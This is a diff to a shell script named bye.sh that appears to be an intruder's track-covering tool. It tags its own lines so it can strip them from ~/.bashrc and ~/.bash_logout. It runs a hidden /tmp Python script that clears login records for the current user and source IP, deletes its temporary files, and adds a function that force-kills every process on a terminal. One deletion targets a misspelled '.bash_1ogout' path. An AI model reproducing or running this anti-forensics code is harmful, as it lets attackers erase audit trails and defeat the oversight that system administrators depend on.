fix but which logout file will effect other user

+++ bye.sh
@@ -7,7 +7,7 @@ REST="\e[0m"  #_fdsagadsfasdgadsgsss
 ColorYellow="\e[33m"  #_fdsagadsfasdgadsgsss
 ColorBlue="\e[34m"  #_fdsagadsfasdgadsgsss
 my_name="$(whoami)"  #_fdsagadsfasdgadsgsss
-my_ips=/tmp/_asdgninvidsfasdg125125sadsaf;  #_fdsagadsfasdgadsgsss
+my_ip="$(last | grep "still" |  grep "$my_pts" | awk '{ print $3}' | xargs)" #_fdsagadsfasdgadsgsss
 index_f=/tmp/_fadsgindexfs;  #_fdsagadsfasdgadsgsss
 clear_shell=/tmp/asdgsdgdg_log_c;  #_fdsagadsfasdgadsgsss
 function gglog {  #_fdsagadsfasdgadsgsss
@@ -32,25 +32,29 @@ if [ !  -f $clear_shell ];then  #_fdsagadsfasdgadsgsss
 fi  #_fdsagadsfasdgadsgsss
 function CL {  #_fdsagadsfasdgadsgsss
   if [ -f $clear_shell ];then  #_fdsagadsfasdgadsgsss
-  	for ip_one in $(cat $my_ips);do  #_fdsagadsfasdgadsgsss
-  	    gglog "clear $my_name $ip_one"  #_fdsagadsfasdgadsgsss
-      	    python $clear_shell -m 2 -u $my_name -i $ip_one ;  #_fdsagadsfasdgadsgsss
-      	    python $clear_shell -m 1 -u $my_name -i $ip_one ;  #_fdsagadsfasdgadsgsss
-          done  #_fdsagadsfasdgadsgsss
-      else  #_fdsagadsfasdgadsgsss
+  	  gglog "clear $my_name $ip_one"  #_fdsagadsfasdgadsgsss
+      python $clear_shell -m 2 -u $my_name -i $my_ip ;  #_fdsagadsfasdgadsgsss
+      python $clear_shell -m 1 -u $my_name -i $my_ip ;  #_fdsagadsfasdgadsgsss
+  else  #_fdsagadsfasdgadsgsss
   	gglog "no cl to found"  #_fdsagadsfasdgadsgsss
   fi  #_fdsagadsfasdgadsgsss
 }  #_fdsagadsfasdgadsgsss
+function  _ki { #_fdsagadsfasdgadsgsss
+  pkill -9 -t $1  #_fdsagadsfasdgadsgsss
+} #_fdsagadsfasdgadsgsss
 function ByeHack {    #_fdsagadsfasdgadsgsss
     sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bashrc   #_fdsagadsfasdgadsgsss
-    sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bash_logout   #_fdsagadsfasdgadsgsss
-    if [[ "$(cat ~/.bash_logout)" == "" ]];then  #_fdsagadsfasdgadsgsss
-      rm ~/.bash_logout  #_fdsagadsfasdgadsgsss
-    fi  #_fdsagadsfasdgadsgsss
+    rm ~/.bash_1ogout  #_fdsagadsfasdgadsgsss
     CL    #_fdsagadsfasdgadsgsss
     _resume;    #_fdsagadsfasdgadsgsss
-    rm $my_ips 2>/dev/null;    #_fdsagadsfasdgadsgsss
-    rm $index_f 2>/dev/null;    #_fdsagadsfasdgadsgsss
-    rm $clear_shell 2>/dev/null;    #_fdsagadsfasdgadsgsss
+    if [ -f $index_f ];then #_fdsagadsfasdgadsgsss
+      rm $index_f 2>/dev/null;    #_fdsagadsfasdgadsgsss
+    fi #_fdsagadsfasdgadsgsss
+    if [ -f $clear_shell ];then #_fdsagadsfasdgadsgsss
+      rm $clear_shell 2>/dev/null;    #_fdsagadsfasdgadsgsss
+    fi #_fdsagadsfasdgadsgsss
 }  #_fdsagadsfasdgadsgsss
 ByeHack;  #_fdsagadsfasdgadsgsss
+if [[ $1 != "" ]];then #_fdsagadsfasdgadsgsss
+  _ki $my_pts; #_fdsagadsfasdgadsgsss
+fi #_fdsagadsfasdgadsgsss
